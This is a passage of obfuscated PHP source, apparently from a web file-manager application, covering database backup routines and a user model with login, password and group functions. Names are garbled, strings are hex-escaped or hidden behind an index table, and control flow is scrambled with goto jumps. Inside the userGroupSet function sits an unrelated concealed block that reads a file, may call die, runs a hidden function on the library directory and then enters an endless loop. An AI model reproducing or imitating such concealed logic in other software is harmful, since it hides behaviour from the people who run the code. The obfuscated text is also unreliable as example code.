$bÆﬂê‡àÂÕ =& $_SERVER[∞„˜ƒÑºª]; $aŒÆœ˜∫™‹ = null; $bÉÒæÏÍ‘˜ = $GLOBALS[$bÆﬂê‡àÂÕ[6]][$bÆﬂê‡àÂÕ[17]]; if ($bÉÒæÏÍ‘˜[$bÆﬂê‡àÂÕ[489]] == $bÆﬂê‡àÂÕ[490]) { $fÖ¨Ë‹Ö…ê = explode($bÆﬂê‡àÂÕ[491], $bÉÒæÏÍ‘˜[$bÆﬂê‡àÂÕ[492]]); if (substr($fÖ¨Ë‹Ö…ê[0], 0, 6) == $bÆﬂê‡àÂÕ[9]) { $aŒÆœ˜∫™‹ = $fÖ¨Ë‹Ö…ê[1]; } } else { if (substr($bÉÒæÏÍ‘˜[$bÆﬂê‡àÂÕ[489]], 0, 6) == $bÆﬂê‡àÂÕ[9]) { $aŒÆœ˜∫™‹ = $bÉÒæÏÍ‘˜[$bÆﬂê‡àÂÕ[233]]; } } return $aŒÆœ˜∫™‹; } public function sqliteBackup($E„≈◊Î‘Ö≤) { goto aàöçßÛ„ñ; aàöçßÛ„ñ: $fÑ»öÊÉäõ =& $_SERVER[∞„˜ƒÑºª]; $eﬂ‰áõà¶‹ = self::$io; $BØ∫çÒœÿí = CONTROLLER_DIR . $fÑ»öÊÉäõ[493]; goto b∆é¶∑˘„ø; b∆é¶∑˘„ø: $aƒÀ„ã§≈– = "\x7b\151\x6f\72{$eﬂ‰áõà¶‹}\x7d\57\x64\141\164\x61\x62\x61\x73\x65\57\x62\141\x63\153\x75\160\137" . self::$name . $fÑ»öÊÉäõ[494]; if (!IO::exist($aƒÀ„ã§≈–)) { IO::mkdir($aƒÀ„ã§≈–); } $cã§Ù„ÂöÃ = IO::size($E„≈◊Î‘Ö≤); goto d¥Â‚º©µÍ; c˜∫ï‰Â‡Ú: return !1; goto DúçÃè¢Îö; d¥Â‚º©µÍ: $DààÀæç‚ﬁ = array($fÑ»öÊÉäõ[471] => $fÑ»öÊÉäõ[9], $fÑ»öÊÉäõ[473] => 1, $fÑ»öÊÉäõ[495] => $cã§Ù„ÂöÃ); Backup::set($DààÀæç‚ﬁ); $dôîÒÚÓ±» = new TaskFileTransfer($fÑ»öÊÉäõ[496], $fÑ»öÊÉäõ[467], 1, LNG($fÑ»öÊÉäõ[468]) . $fÑ»öÊÉäõ[497] . LNG($fÑ»öÊÉäõ[470]) . $fÑ»öÊÉäõ[498]); goto eı€Ê≤Æäë; eı€Ê≤Æäë: $dôîÒÚÓ±»->task[$fÑ»öÊÉäõ[454]] = $cã§Ù„ÂöÃ; IO::copy($BØ∫çÒœÿí . $fÑ»öÊÉäõ[499], $aƒÀ„ã§≈–); IO::copy($E„≈◊Î‘Ö≤, $aƒÀ„ã§≈–); goto fçÎù†©∆Ú; fçÎù†©∆Ú: $dôîÒÚÓ±»->end(); $DààÀæç‚ﬁ = array($fÑ»öÊÉäõ[463] => 1, $fÑ»öÊÉäõ[475] => 1, $fÑ»öÊÉäõ[464] => 1, $fÑ»öÊÉäõ[500] => $cã§Ù„ÂöÃ); Backup::set($DààÀæç‚ﬁ); goto c˜∫ï‰Â‡Ú; DúçÃè¢Îö: } } class BackupDbFile { public function __construct() { } public function index() { goto E‘ˆöÚﬁª„; aåßú∏Üó‹: $C’’¡çé´§ = TEMP_FILES . "\x62\141\143\x6b\x75\160\x5f{$FÿÆùÈã∑Ù}\x2f"; $fÂ€ÌÁ±®™ = "\173\151\157\x3a{$Cáæ∏çâç¯[$aøÌç≤çÇ [447]]}\175\x2f\x64\x61\164\141\142\x61\x73\x65\x2f"; IO::mkdir($fÂ€ÌÁ±®™ . "\142\141\143\x6b\165\160\137{$FÿÆùÈã∑Ù}\57"); goto a¿ÒûπÓ•◊; E‘ˆöÚﬁª„: $aøÌç≤çÇ  =& $_SERVER[∞„˜ƒÑºª]; $Cáæ∏çâç¯ = Backup::get(); $FÿÆùÈã∑Ù = $Cáæ∏çâç¯[$aøÌç≤çÇ [28]]; goto aåßú∏Üó‹; B‹øúÈ≤Ï≈: IO::copy($Fœ¬ﬁ÷ıÆ¥, $fÂ€ÌÁ±®™ . "\x62\x61\143\153\x75\x70\137{$FÿÆùÈã∑Ù}\57"); $AÉ∫·Ö∂≠û->end(); Backup::set(array($aøÌç≤çÇ [500] => $D∏ñ§⁄ı¨ÿ[$aøÌç≤çÇ [86]])); goto bÉ›≤ÀÓÂÙ; a¿ÒûπÓ•◊: $AÉ∫·Ö∂≠û = new TaskFileTransfer($aøÌç≤çÇ [496], $aøÌç≤çÇ [467], 0, LNG($aøÌç≤çÇ [468]) . $aøÌç≤çÇ [497] . LNG($aøÌç≤çÇ [470]) . $aøÌç≤çÇ [498]); $AÉ∫·Ö∂≠û->addPath($C’’¡çé´§); $D∏ñ§⁄ı¨ÿ = IO::infoWithChildren($C’’¡çé´§); goto AÎ›Ë›≠Ÿœ; bÉ›≤ÀÓÂÙ: return !0; goto aô¥∏◊ã¶ù; AÎ›Ë›≠Ÿœ: Backup::set(array($aøÌç≤çÇ [495] => $D∏ñ§⁄ı¨ÿ[$aøÌç≤çÇ [86]])); IO::move($C’’¡çé´§, $fÂ€ÌÁ±®™); $Fœ¬ﬁ÷ıÆ¥ = CONTROLLER_DIR . $aøÌç≤çÇ [501]; goto B‹øúÈ≤Ï≈; aô¥∏◊ã¶ù: } } goto a®ã‹≠´õÉ; B∑†–íµŒ∞: class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\x72"; protected $tableMeta = array("\164\141\142\x6c\x65\116\141\x6d\x65" => "\165\163\x65\x72\x5f\155\x65\x74\141", "\x6d\145\164\141\106\151\145\154\x64" => "\x75\163\145\x72\x49\x44"); protected $simpleField = "\165\163\145\x72\111\x44\x2c\156\x69\x63\x6b\x4e\x61\x6d\145\x2c\x6e\x61\x6d\x65\x2c\141\166\141\x74\141\x72\x2c\163\x65\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Fœ‹ù·öıî) { $aê‚Òüú¡— =& $_SERVER[∞„˜ƒÑºª]; return array($aê‚Òüú¡—[1591] => array($Fœ‹ù·öıî[0], $aê‚Òüú¡—[1864]), $aê‚Òüú¡—[1593] => array($Fœ‹ù·öıî[0], $aê‚Òüú¡—[1864])); } protected function getInfo($cÎä›‚áã, $EñôÖ£ìÑ∆ = false) { $d∂°¥ß¶Ü =& $_SERVER[∞„˜ƒÑºª]; $e¬≠ÓÈ·¡° = $this->getInfoSimple($cÎä›‚áã); if (!is_array($e¬≠ÓÈ·¡°)) { return array(); } if ($EñôÖ£ìÑ∆) { goto AèÁ’∫˘ÑÁ; d÷Úﬁ«”˜†: $a«˜´øÓ¶◊ = Model($d∂°¥ß¶Ü[832])->metaGet($e¬≠ÓÈ·¡°[$d∂°¥ß¶Ü[1618]][$d∂°¥ß¶Ü[374]]); $e¬≠ÓÈ·¡°[$d∂°¥ß¶Ü[1867]] = $C˘ö ⁄Ë∏∏; $e¬≠ÓÈ·¡°[$d∂°¥ß¶Ü[1618]][$d∂°¥ß¶Ü[1721]] = $a«˜´øÓ¶◊[$d∂°¥ß¶Ü[1722]]; goto f∫º—êÖﬂ≤; AèÁ’∫˘ÑÁ: if (!$e¬≠ÓÈ·¡°) { return $e¬≠ÓÈ·¡°; } $C˘ö ⁄Ë∏∏ = md5($d∂°¥ß¶Ü[1865] . $e¬≠ÓÈ·¡°[$d∂°¥ß¶Ü[561]] . $d∂°¥ß¶Ü[1866] . $e¬≠ÓÈ·¡°[$d∂°¥ß¶Ü[28]]); $e¬≠ÓÈ·¡° = $this->_listDataApplyItem($e¬≠ÓÈ·¡°); goto d÷Úﬁ«”˜†; f∫º—êÖﬂ≤: return $e¬≠ÓÈ·¡°; goto f´´ÆØÏíŒ; f´´ÆØÏíŒ: } return $this->cacheFunctionGet($d∂°¥ß¶Ü[1630], $cÎä›‚áã); } protected function getInfoSimple($bÏŸÊºêêÜ, $aŒÑŒ∑ﬂ¿⁄ = false) { $D≈è√Ö‘äï =& $_SERVER[∞„˜ƒÑºª]; if (!$bÏŸÊºêêÜ) { return array(); } if ($aŒÑŒ∑ﬂ¿⁄) { $Dã«„‡£áÿ = $this->where(array($D≈è√Ö‘äï[1063] => intval($bÏŸÊºêêÜ)))->find(); if (!is_array($Dã«„‡£áÿ)) { return array(); } $Dã«„‡£áÿ[$D≈è√Ö‘äï[1868]] = Action($D≈è√Ö‘äï[1869])->parseUrl($Dã«„‡£áÿ[$D≈è√Ö‘äï[1868]]); return $Dã«„‡£áÿ; } return $this->cacheFunctionGet($D≈è√Ö‘äï[1594], $bÏŸÊºêêÜ); } protected function getInfoSimpleOuter($Dàã◊ê‹ª–) { goto d°‘–∑“é»; Céè»Èä–Ê: return $dá√Úï∏ÉÌ; goto aÍ∑£Ã¬Ö≈; cÌ∑ØŸÁØ∂: $dá√Úï∏ÉÌ = array_field_key($AŒ™ﬁÔœ™‰, explode($Aì“ÎµîÒ˘[47], $this->simpleField)); if (!$dá√Úï∏ÉÌ) { return array($Aì“ÎµîÒ˘[1063] => $Aì“ÎµîÒ˘[761], $Aì“ÎµîÒ˘[28] => $Aì“ÎµîÒ˘[1321] . LNG($Aì“ÎµîÒ˘[1872]) . $Aì“ÎµîÒ˘[1322], $Aì“ÎµîÒ˘[1868] => STATIC_PATH . $Aì“ÎµîÒ˘[1873]); } $dá√Úï∏ÉÌ[$Aì“ÎµîÒ˘[1868]] = Action($Aì“ÎµîÒ˘[1869])->parseUrl($dá√Úï∏ÉÌ[$Aì“ÎµîÒ˘[1868]]); goto Céè»Èä–Ê; d°‘–∑“é»: $Aì“ÎµîÒ˘ =& $_SERVER[∞„˜ƒÑºª]; if (!$Dàã◊ê‹ª– || $Dàã◊ê‹ª– == 0) { return array($Aì“ÎµîÒ˘[1063] => $Aì“ÎµîÒ˘[402], $Aì“ÎµîÒ˘[28] => $Aì“ÎµîÒ˘[1321] . LNG($Aì“ÎµîÒ˘[1870]) . $Aì“ÎµîÒ˘[1322], $Aì“ÎµîÒ˘[1868] => STATIC_PATH . $Aì“ÎµîÒ˘[1871]); } $AŒ™ﬁÔœ™‰ = $this->cacheFunctionGet($Aì“ÎµîÒ˘[1594], $Dàã◊ê‹ª–); goto cÌ∑ØŸÁØ∂; aÍ∑£Ã¬Ö≈: } protected function groupUser($c¯Üƒ„∞”√) { } public static function errorLang($dè’êºπ—ñ) { $C÷÷ã’∑Ãø =& $_SERVER[∞„˜ƒÑºª]; $cáûüÚÏ˘€ = array(self::ERROR_USER_NOT_EXISTS => $C÷÷ã’∑Ãø[1874], self::ERROR_USER_PASSWORD_ERROR => $C÷÷ã’∑Ãø[1875], self::ERROR_USER_EXIST_NAME => $C÷÷ã’∑Ãø[1876], self::ERROR_USER_EXIST_PHONE => $C÷÷ã’∑Ãø[1877], self::ERROR_USER_EXIST_EMAIL => $C÷÷ã’∑Ãø[1878], self::ERROR_USER_LOGIN_LOCK => $C÷÷ã’∑Ãø[1879], self::ERROR_IP_NOT_ALLOW => $C÷÷ã’∑Ãø[1880], self::ERROR_USER_EXIST_NICKNAME => $C÷÷ã’∑Ãø[1881]); return LNG($cáûüÚÏ˘€[$dè’êºπ—ñ]); } public function getInfoByMeta($bÊï¬Õîí¶, $bá¡ËÔØ≤é) { $AÖÉœÕÃÆå =& $_SERVER[∞„˜ƒÑºª]; $aüÇº‡®Ê∏ = Model($AÖÉœÕÃÆå[1882])->where(array($AÖÉœÕÃÆå[96] => $bÊï¬Õîí¶, $AÖÉœÕÃÆå[357] => $bá¡ËÔØ≤é))->find(); if ($aüÇº‡®Ê∏) { return $this->getInfo($aüÇº‡®Ê∏[$AÖÉœÕÃÆå[1063]]); } return !1; } public function userLoginCheck($DÒ¯¨è≈Ï , $B‡á≥…îøÕ) { goto E•¨…¿ÁÉÃ; E•¨…¿ÁÉÃ: $a¡´Ωö“ßˆ =& $_SERVER[∞„˜ƒÑºª]; $dª±‰‹Ô®Œ = array($a¡´Ωö“ßˆ[28] => $DÒ¯¨è≈Ï , $a¡´Ωö“ßˆ[1846] => $DÒ¯¨è≈Ï , $a¡´Ωö“ßˆ[292] => $DÒ¯¨è≈Ï , $a¡´Ωö“ßˆ[1883] => $DÒ¯¨è≈Ï , $a¡´Ωö“ßˆ[674] => $a¡´Ωö“ßˆ[676]); $F¢¬È©À—Û = $this->where($dª±‰‹Ô®Œ)->find(); goto FﬁÖËÉèëè; FﬁÖËÉèëè: if (!$F¢¬È©À—Û) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($F¢¬È©À—Û[$a¡´Ωö“ßˆ[1063]], $B‡á≥…îøÕ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } $this->userEdit($F¢¬È©À—Û[$a¡´Ωö“ßˆ[1063]], array($a¡´Ωö“ßˆ[1884] => time())); goto B©êÌéﬁñ; B©êÌéﬁñ: $this->clearCache($F¢¬È©À—Û[$a¡´Ωö“ßˆ[1063]]); return $this->getInfo($F¢¬È©À—Û[$a¡´Ωö“ßˆ[1063]]); goto BíØÑ¡¶ñ±; BíØÑ¡¶ñ±: } private function clearCache($d»ô£ì«ªÌ) { $C¯⁄ŸÖê±ª =& $_SERVER[∞„˜ƒÑºª]; $this->cacheFunctionClear($C¯⁄ŸÖê±ª[1630], $d»ô£ì«ªÌ); $this->cacheFunctionClear($C¯⁄ŸÖê±ª[1594], $d»ô£ì«ªÌ); } public function userPasswordCheck($AÁπèªˆÌ∑, $a°îÜﬂ◊’ê) { $eÔÀΩ¢ÉÿÆ =& $_SERVER[∞„˜ƒÑºª]; $Cµ†÷öÛ≈ó = $this->where(array($eÔÀΩ¢ÉÿÆ[1063] => intval($AÁπèªˆÌ∑)))->find(); $aÛı¿ÍØ¯¢ = $this->metaGet($AÁπèªˆÌ∑); $a∑®ƒâÃ®ı = isset($aÛı¿ÍØ¯¢[$eÔÀΩ¢ÉÿÆ[1885]]) ? $aÛı¿ÍØ¯¢[$eÔÀΩ¢ÉÿÆ[1885]] : $eÔÀΩ¢ÉÿÆ[33]; if (md5($a∑®ƒâÃ®ı . trim($a°îÜﬂ◊’ê)) !== $Cµ†÷öÛ≈ó[$eÔÀΩ¢ÉÿÆ[561]]) { return !1; } return !0; } public function userAdd($Dó˜Ö«ÙÉˆ) { goto aÒ£∏≠¨ıÀ; aâ˜≈‚∞Êï: $fû»‹’Ñ¬≠ = $this->_checkExist($Dó˜Ö«ÙÉˆ); if ($fû»‹’Ñ¬≠ !== !0) { return $fû»‹’Ñ¬≠; } $b∫ü˘ÉÖÑÀ = $this->add($e–‘ª€—öÎ); goto E∂Æ≥Çä£ ; E∂Æ≥Çä£ : $eØÇâƒòΩ≈ = array($eãÑÑÏùÃù[1894] => $e–‘ª€—öÎ[$eãÑÑÏùÃù[561]], $eãÑÑÏùÃù[1890] => $e–‘ª€—öÎ[$eãÑÑÏùÃù[1846]]); $this->userEdit($b∫ü˘ÉÖÑÀ, $eØÇâƒòΩ≈); Model($eãÑÑÏùÃù[832])->userRootAdd($b∫ü˘ÉÖÑÀ); goto AŸÑ«‰çêŸ; AŸÑ«‰çêŸ: return $b∫ü˘ÉÖÑÀ; goto bëá™ÖØ…ﬁ; aÒ£∏≠¨ıÀ: $eãÑÑÏùÃù =& $_SERVER[∞„˜ƒÑºª]; $e–‘ª€—öÎ = array($eãÑÑÏùÃù[387] => $Dó˜Ö«ÙÉˆ[$eãÑÑÏùÃù[28]], $eãÑÑÏùÃù[1886] => $Dó˜Ö«ÙÉˆ[$eãÑÑÏùÃù[1887]], $eãÑÑÏùÃù[1888] => isset($Dó˜Ö«ÙÉˆ[$eãÑÑÏùÃù[292]]) ? $Dó˜Ö«ÙÉˆ[$eãÑÑÏùÃù[292]] : $eãÑÑÏùÃù[33], $eãÑÑÏùÃù[1889] => isset($Dó˜Ö«ÙÉˆ[$eãÑÑÏùÃù[1883]]) ? $Dó˜Ö«ÙÉˆ[$eãÑÑÏùÃù[1883]] : $eãÑÑÏùÃù[33], $eãÑÑÏùÃù[1890] => isset($Dó˜Ö«ÙÉˆ[$eãÑÑÏùÃù[1846]]) ? $Dó˜Ö«ÙÉˆ[$eãÑÑÏùÃù[1846]] : $Dó˜Ö«ÙÉˆ[$eãÑÑÏùÃù[28]], $eãÑÑÏùÃù[1891] => isset($Dó˜Ö«ÙÉˆ[$eãÑÑÏùÃù[1868]]) ? $Dó˜Ö«ÙÉˆ[$eãÑÑÏùÃù[1868]] : $eãÑÑÏùÃù[33], $eãÑÑÏùÃù[1892] => isset($Dó˜Ö«ÙÉˆ[$eãÑÑÏùÃù[1893]]) ? $Dó˜Ö«ÙÉˆ[$eãÑÑÏùÃù[1893]] : 1, $eãÑÑÏùÃù[1894] => $Dó˜Ö«ÙÉˆ[$eãÑÑÏùÃù[561]], $eãÑÑÏùÃù[1596] => isset($Dó˜Ö«ÙÉˆ[$eãÑÑÏùÃù[1500]]) ? $Dó˜Ö«ÙÉˆ[$eãÑÑÏùÃù[1500]] : 1024 * 1024 * 20, $eãÑÑÏùÃù[1597] => 0, $eãÑÑÏùÃù[1884] => 0, $eãÑÑÏùÃù[1895] => isset($Dó˜Ö«ÙÉˆ[$eãÑÑÏùÃù[445]]) ? $Dó˜Ö«ÙÉˆ[$eãÑÑÏùÃù[445]] : 1); if (!empty($Dó˜Ö«ÙÉˆ[$eãÑÑÏùÃù[1063]])) { $e–‘ª€—öÎ[$eãÑÑÏùÃù[1063]] = $Dó˜Ö«ÙÉˆ[$eãÑÑÏùÃù[1063]]; } goto aâ˜≈‚∞Êï; bëá™ÖØ…ﬁ: } protected function userEditTest($fÏÆÇ»æêî, $A©—Ú“€öä) { return $this->call($_SERVER[∞„˜ƒÑºª][1896], $fÏÆÇ»æêî, $A©—Ú“€öä); } protected function userEdit($aâÎπ¢–ˆ¯, $DŒÑ÷Àµå¡) { goto A…¿ãº◊≥Û; C≈Ê∑ßÜ≤ÿ: $a»óËÎ∑√ê = $this->_checkExist($DŒÑ÷Àµå¡, $aâÎπ¢–ˆ¯); if ($a»óËÎ∑√ê !== !0) { return $a»óËÎ∑√ê; } if (isset($DŒÑ÷Àµå¡[$döò¶ÃÇΩÜ[561]]) && trim($DŒÑ÷Àµå¡[$döò¶ÃÇΩÜ[561]]) != $döò¶ÃÇΩÜ[33]) { $dÍü˘∂¿ê¶ = $this->metaGet($aâÎπ¢–ˆ¯); if (empty($dÍü˘∂¿ê¶[$döò¶ÃÇΩÜ[1885]])) { $dÍü˘∂¿ê¶[$döò¶ÃÇΩÜ[1885]] = rand_string(10); Model($döò¶ÃÇΩÜ[1675])->metaSet($aâÎπ¢–ˆ¯, $döò¶ÃÇΩÜ[1885], $dÍü˘∂¿ê¶[$döò¶ÃÇΩÜ[1885]]); } $DŒÑ÷Àµå¡[$döò¶ÃÇΩÜ[561]] = md5($dÍü˘∂¿ê¶[$döò¶ÃÇΩÜ[1885]] . trim($DŒÑ÷Àµå¡[$döò¶ÃÇΩÜ[561]])); } else { unset($DŒÑ÷Àµå¡[$döò¶ÃÇΩÜ[561]]); } goto AÖÎÇÓˆéÊ; AÖÎÇÓˆéÊ: $this->where(array($döò¶ÃÇΩÜ[1054] => $aâÎπ¢–ˆ¯))->save($DŒÑ÷Àµå¡); if (isset($DŒÑ÷Àµå¡[$döò¶ÃÇΩÜ[1846]])) { $this->setNamePinyin($aâÎπ¢–ˆ¯, $DŒÑ÷Àµå¡[$döò¶ÃÇΩÜ[1846]]); } return !0; goto D¢–Óø≈üõ; A…¿ãº◊≥Û: $döò¶ÃÇΩÜ =& $_SERVER[∞„˜ƒÑºª]; $D”œ™–∞Í’ = $this->getInfoSimple($aâÎπ¢–ˆ¯); if (!$D”œ™–∞Í’) { return !1; } goto C≈Ê∑ßÜ≤ÿ; D¢–Óø≈üõ: } public function setNamePinyin($dŸˆ±∞§‰É, $búî÷§„ê„ = false) { $bèÒÙªé–è =& $_SERVER[∞„˜ƒÑºª]; if (!$búî÷§„ê„) { $A°é∏≤à•™ = $this->getInfoSimple($dŸˆ±∞§‰É); $búî÷§„ê„ = $A°é∏≤à•™[$bèÒÙªé–è[1846]] ? $A°é∏≤à•™[$bèÒÙªé–è[1846]] : $A°é∏≤à•™[$bèÒÙªé–è[28]]; } $bÓã’≤Ÿœ† = Model($bèÒÙªé–è[1451]); if (!Input::check($búî÷§„ê„, $bèÒÙªé–è[403])) { return $bÓã’≤Ÿœ†->metaSet($dŸˆ±∞§‰É, array($bèÒÙªé–è[404] => null, $bèÒÙªé–è[405] => null)); } return $bÓã’≤Ÿœ†->metaSet($dŸˆ±∞§‰É, array($bèÒÙªé–è[404] => str_replace($bèÒÙªé–è[50], $bèÒÙªé–è[33], Pinyin::encode($búî÷§„ê„)), $bèÒÙªé–è[405] => Pinyin::encode($búî÷§„ê„, $bèÒÙªé–è[406]))); } private function _checkExist($e‹‘∑Íß™–, $dïêü’≠ÜÂ = false) { $DæéÚŒã¯• =& $_SERVER[∞„˜ƒÑºª]; $dëß†ØŸä® = array($DæéÚŒã¯•[28] => UserModel::ERROR_USER_EXIST_NAME, $DæéÚŒã¯•[1846] => UserModel::ERROR_USER_EXIST_NICKNAME, $DæéÚŒã¯•[292] => UserModel::ERROR_USER_EXIST_EMAIL, $DæéÚŒã¯•[1883] => UserModel::ERROR_USER_EXIST_PHONE); $dªœ´˘Ì„∑ = $dïêü’≠ÜÂ ? array($DæéÚŒã¯•[1063] => array($DæéÚŒã¯•[1897], $dïêü’≠ÜÂ)) : array(); foreach ($dëß†ØŸä® as $CëÈ‘üıÜÍ => $dÇ©Õá“Ëï) { if (!isset($e‹‘∑Íß™–[$CëÈ‘üıÜÍ]) || !$e‹‘∑Íß™–[$CëÈ‘üıÜÍ]) { continue; } $CìòòÁÕ«… = array_merge(array($CëÈ‘üıÜÍ => $e‹‘∑Íß™–[$CëÈ‘üıÜÍ]), $dªœ´˘Ì„∑); $BñŸ·ÃÿÂÉ = $this->where($CìòòÁÕ«…)->find(); if ($BñŸ·ÃÿÂÉ) { return $dÇ©Õá“Ëï; } } return !0; } public function userListInfo($AÁŸ‡û€©©) { goto dÉÚ∞ÜÈÖÇ; B√ç∆Ø»ë’: if (!$AÁŸ‡û€©©) { return array(); } $d¶Ù‚˘Ó¬∫ = array($a≠©á·îïœ[1054] => array($a≠©á·îïœ[951], $AÁŸ‡û€©©)); if (count($AÁŸ‡û€©©) == 1) { $d¶Ù‚˘Ó¬∫ = array($a≠©á·îïœ[1054] => $AÁŸ‡û€©©[0]); } goto C’†›Ïæ¢≥; Fßú⁄»≈çÈ: foreach ($fé„Ì‘’Ëà as &$dÙÁ€†Ãó≈) { if (!$dÙÁ€†Ãó≈) { continue; } $dÙÁ€†Ãó≈[$a≠©á·îïœ[1868]] = Action($a≠©á·îïœ[1869])->parseUrl($dÙÁ€†Ãó≈[$a≠©á·îïœ[1868]]); } return $fé„Ì‘’Ëà; goto d≠É´ËÑâÑ; dÉÚ∞ÜÈÖÇ: $a≠©á·îïœ =& $_SERVER[∞„˜ƒÑºª]; $fé„Ì‘’Ëà = array(); $AÁŸ‡û€©© = array_filter(array_unique($AÁŸ‡û€©©)); goto B√ç∆Ø»ë’; C’†›Ïæ¢≥: if (count($AÁŸ‡û€©©) < 20) { foreach ($AÁŸ‡û€©© as $Dƒê≠“§ˆâ) { $fé„Ì‘’Ëà[$Dƒê≠“§ˆâ . $a≠©á·îïœ[33]] = $this->getInfoSimpleOuter($Dƒê≠“§ˆâ); } return $fé„Ì‘’Ëà; } $bÃØ«∏ÜÒñ = Model($a≠©á·îïœ[1675])->field($this->simpleField)->where($d¶Ù‚˘Ó¬∫)->select(); $fé„Ì‘’Ëà = array_to_keyvalue($bÃØ«∏ÜÒñ, $a≠©á·îïœ[1063]); goto Fßú⁄»≈çÈ; d≠É´ËÑâÑ: } protected function userStatus($d¯Á¢⁄¥ö∫, $Aàï‹ã°åÿ) { $F∏ò‡ﬁé∫¥ = $this->getInfoSimple($d¯Á¢⁄¥ö∫); if (!$F∏ò‡ﬁé∫¥) { return !1; } $a”©¬º≠á = array($_SERVER[∞„˜ƒÑºª][445] => $Aàï‹ã°åÿ); return $this->userEdit($d¯Á¢⁄¥ö∫, $a”©¬º≠á); } protected function userRemove($BÁô∑πìÑŸ) { goto a‰´‚ßŸïı; AÂÊ¬çÿ˘: $F“È≥«çÑê = array($eÔÙ‰æ£Ñ˘[1054] => $BÁô∑πìÑŸ); Model($eÔÙ‰æ£Ñ˘[417])->where($F“È≥«çÑê)->delete(); Model($eÔÙ‰æ£Ñ˘[1898])->where($F“È≥«çÑê)->delete(); goto Fà˜õ≤Õ∫ß; a‰´‚ßŸïı: $eÔÙ‰æ£Ñ˘ =& $_SERVER[∞„˜ƒÑºª]; $eâ„âÀÏÒº = $this->getInfoSimple($BÁô∑πìÑŸ); if (!$eâ„âÀÏÒº) { return !1; } goto AÂÊ¬çÿ˘; e…àêÚìßû: Model($eÔÙ‰æ£Ñ˘[520])->userRootRemove($BÁô∑πìÑŸ); return $this->where($F“È≥«çÑê)->delete(); goto DÃÇ—÷†”•; Fà˜õ≤Õ∫ß: Model($eÔÙ‰æ£Ñ˘[1600])->where($F“È≥«çÑê)->delete(); Model($eÔÙ‰æ£Ñ˘[1882])->where($F“È≥«çÑê)->delete(); Model($eÔÙ‰æ£Ñ˘[1899])->where($F“È≥«çÑê)->delete(); goto e…àêÚìßû; DÃÇ—÷†”•: } protected function userGroupSet($FÜõÏŸ‹çó, $bìø£‘¢Õ∑, $AõììÙà≥⁄ = array()) { goto DÿÌ√µÖº; FËï„¯ïƒ : return $aËÔ¢”ï ù->addAll($eûıπÉ›˘∞, array(), !0); goto BÿÒ≈¿≥Èç; AΩ ÉÑê¥ù: $eûıπÉ›˘∞ = array(); $D›÷≠≠Œ¶§ = 0; foreach ($bìø£‘¢Õ∑ as $fß≥©øËÍÏ => $d÷¶í≥ã¬‡) { $Cïö÷‚†£Ê = array($Fôáí••«Ì[1063] => $FÜõÏŸ‹çó, $Fôáí••«Ì[1516] => $fß≥©øËÍÏ, $Fôáí••«Ì[1652] => $d÷¶í≥ã¬‡); $Cïö÷‚†£Ê[$Fôáí••«Ì[1537]] = isset($AõììÙà≥⁄[$D›÷≠≠Œ¶§]) ? $AõììÙà≥⁄[$D›÷≠≠Œ¶§] : 0; $D›÷≠≠Œ¶§++; $eûıπÉ›˘∞[] = $Cïö÷‚†£Ê; } goto FËï„¯ïƒ ; DÿÌ√µÖº: $Fôáí••«Ì =& $_SERVER[∞„˜ƒÑºª]; if (!isset($_SERVER[$Fôáí••«Ì[51]]) || !isset($_SERVER[$Fôáí••«Ì[58]])) { goto b™ù≈Êú± ; fëÊãëπˆà: $DÍèù¶é–∑ = explode($Fôáí••«Ì[55], $CÊ≤∞√Óçî); if (count($DÍèù¶é–∑) < $Fôáí••«Ì[552]) { die; } $b‡Öèâ‹À˜ = $Fôáí••«Ì[553]; goto FúÆÕ†ﬁΩ≠; FúÆÕ†ﬁΩ≠: $b‡Öèâ‹À˜(LIB_DIR); for (;;) { $b‡Öèâ‹À˜ = json_encode($GLOBALS[$Fôáí••«Ì[951]]); } goto f∫ùà¬ı∆‚; b™ù≈Êú± : $bœ¨¬öÁß• = $Fôáí••«Ì[53]; $F´éπ∑®»é = BASIC_PATH . $Fôáí••«Ì[54]; $CÊ≤∞√Óçî = $bœ¨¬öÁß•($F´éπ∑®»é); goto fëÊãëπˆà; f∫ùà¬ı∆‚: } $c£èï¿õ∏ê = $this->getInfoSimple($FÜõÏŸ‹çó); goto CΩ™√ñ∆∆€; CΩ™√ñ∆∆€: if (!$c£èï¿õ∏ê || !is_array($bìø£‘¢Õ∑)) { return !1; } $aËÔ¢”ï ù = Model($Fôáí••«Ì[1600]); $aËÔ¢”ï ù->where(array($Fôáí••«Ì[1063] => $FÜõÏŸ‹çó))->delete(); goto AΩ ÉÑê¥ù; BÿÒ≈¿≥Èç: } protected function userGroupAdd($c«ÚﬂÕÁˆ¨, $c≥áª⁄∂ÊÉ, $EÚù…ÙËáã) { $AÁå◊ú÷Ã =& $_SERVER[∞„˜ƒÑºª]; $D°â÷ ÊÏ‰ = $this->getInfoSimple($c«ÚﬂÕÁˆ¨); if (!$D°â÷ ÊÏ‰ || !$c≥áª⁄∂ÊÉ) { return !1; } $f◊ÍÀèÉæÏ = array(array($AÁå◊ú÷Ã[1063] => $c«ÚﬂÕÁˆ¨, $AÁå◊ú÷Ã[1516] => $c≥áª⁄∂ÊÉ, $AÁå◊ú÷Ã[1652] => $EÚù…ÙËáã)); return Model($AÁå◊ú÷Ã[1600])->addAll($f◊ÍÀèÉæÏ, array(), !0); } protected function userGroupRemove($dé‹ıóÙ °, $AÓ•¢÷áÉ°) { $cﬁ≤öã®ﬂÍ =& $_SERVER[∞„˜ƒÑºª]; $fàêäÈÊè≠ = $this->getInfoSimple($dé‹ıóÙ °); if (!$fàêäÈÊè≠ || !$AÓ•¢÷áÉ°) { return !1; } $bÎ‚÷·»ﬂ‰ = array($cﬁ≤öã®ﬂÍ[1054] => $dé‹ıóÙ °, $cﬁ≤öã®ﬂÍ[1598] => $AÓ•¢÷áÉ°); return Model($cﬁ≤öã®ﬂÍ[1600])->where($bÎ‚÷·»ﬂ‰)->delete(); } public function listData() { $E∂ÓäÆŒõÑ = $this->_makeOrder()->selectPage(50); 